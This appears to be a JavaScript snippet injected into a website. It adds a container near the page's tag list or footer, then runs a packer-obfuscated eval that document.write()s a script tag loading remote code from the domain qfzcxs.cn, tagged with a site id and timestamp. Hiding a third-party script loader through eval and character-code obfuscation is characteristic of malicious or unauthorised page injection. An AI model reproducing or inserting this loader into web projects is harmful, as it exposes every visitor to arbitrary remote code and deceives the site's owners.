var boxid;
function dy_load(siteid) {
    var domainx = "https://qfzcxs.cn/",
    __dyhfid = "q" + Math.random().toString(36).substr(6);
    boxid = "#" + __dyhfid;
    eval(function(p, a, c, k, e, d) {
        e = function(c) {
            return c.toString(36)
        };
        if (!"".replace(/^/, String)) {
            while (c--) {
                d[c.toString(a)] = k[c] || c.toString(a)
            }
            k = [function(e) {
                return d[e]
            }];
            e = function() {
                return "\\w+"
            };
            c = 1
        }
        while (c--) {
            if (k[c]) {
                p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c])
            }
        }
        return p
    } ('9 a(a,b,c){d a[b](c)}a(8,f.6(4,5,7,e,h),"<0"+"c"+"2"+"i"+"3"+"1 "+" g=\'"+n+o+"-"+m+"-"+k l().j()+"\'></0"+"c"+"2"+"i"+"3"+"1>");', 25, 25, "s|t|r|p|119|114|fromCharCode|105|document|function||||return|116|String|src|101||getTime|new|Date|siteid|domainx|__dyhfid".split("|"), 0, {}))
}
!(function() {
    if (b) {
        return
    }
    if ($("#post-tag")[0]) {
        $("#post-tag").after('<div id="box_d" style="margin:0 2%"></div>');
        dy_load("1005")
    } else {
        if ($(".text-center")[0]) {
            $(".text-center").before('<div id="box_d" style="background:#fff;margin:0 2%;padding:2%"></div>');
            dy_load("1005")
        }
    }
    $(function() {
        $(boxid).appendTo($("#box_d"));
        $("#box_d").css("height", "auto")
    })
})();
